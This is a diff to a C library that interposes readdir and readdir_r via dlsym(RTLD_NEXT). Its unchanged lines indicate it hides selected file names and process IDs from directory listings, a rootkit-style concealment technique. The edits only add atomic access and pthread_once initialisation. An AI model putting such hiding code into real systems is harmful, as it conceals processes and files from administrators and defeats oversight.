@@ -89,7 +89,7 @@ static int is_pid_hidden_str(const char *name)
 
 static int should_hide(const char *name)
 {
-    if (!interpose_active)
+    if (!__atomic_load_n(&interpose_active, __ATOMIC_SEQ_CST))
         return 0;
     if (is_name_hidden(name))
         return 1;
@@ -106,14 +106,17 @@ typedef int (*readdir_r_fn)(DIR *, struct dirent *, struct dirent **);
 static readdir_fn   orig_readdir   = NULL;
 static readdir_r_fn orig_readdir_r = NULL;
 
+static pthread_once_t originals_once = PTHREAD_ONCE_INIT;
+
+static void init_originals(void)
+{
+    orig_readdir   = (readdir_fn)dlsym(RTLD_NEXT, "readdir");
+    orig_readdir_r = (readdir_r_fn)dlsym(RTLD_NEXT, "readdir_r");
+}
+
 static void resolve_originals(void)
 {
-    if (!orig_readdir) {
-        orig_readdir = (readdir_fn)dlsym(RTLD_NEXT, "readdir");
-    }
-    if (!orig_readdir_r) {
-        orig_readdir_r = (readdir_r_fn)dlsym(RTLD_NEXT, "readdir_r");
-    }
+    pthread_once(&originals_once, init_originals);
 }
 
 /* ── Interposed readdir ─────────────────────────────────────────── */
@@ -226,13 +229,13 @@ void interpose_unhide_pid(int pid)
 __attribute__((visibility("default")))
 void interpose_set_active(int active)
 {
-    interpose_active = active;
+    __atomic_store_n(&interpose_active, active, __ATOMIC_SEQ_CST);
 }
 
 __attribute__((visibility("default")))
 int interpose_is_active(void)
 {
-    return interpose_active;
+    return __atomic_load_n(&interpose_active, __ATOMIC_SEQ_CST);
 }
 
 __attribute__((visibility("default")))
